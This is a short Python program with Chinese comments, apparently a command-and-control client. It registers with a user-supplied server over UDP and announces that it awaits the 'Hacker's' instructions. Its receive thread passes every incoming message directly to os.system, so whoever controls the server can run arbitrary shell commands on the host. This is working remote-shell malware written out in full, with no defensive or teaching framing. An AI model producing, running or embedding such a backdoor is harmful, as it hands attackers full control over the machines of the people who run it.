import socket,os
import threading

def receive_messages(client):
    """接收服务器消息的线程函数"""
    while True:
        try:
            data, addr = client.recvfrom(1024)
            print(f"服务器消息: {data.decode()}")
            os.system(data.decode())
        except Exception as e:
            print(f"接收消息出错: {e}")
            break

def main():
    # 创建UDP客户端
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    host=input("请输入服务器IP地址 ")
    server_addr = (host, 3729)
    
    # 注册为user
    client.sendto('user'.encode(), server_addr)
    print("您已注册为User，等待接收Hacker的指令...")
    
    # 创建接收消息的线程
    recv_thread = threading.Thread(target=receive_messages, args=(client,))
    recv_thread.daemon = True
    recv_thread.start()
    
    try:
        # User等待接收指令，按Enter键退出
        input("")
    except KeyboardInterrupt:
        pass
    finally:
        client.close()
        print("客户端已关闭")

if __name__ == "__main__":
    main()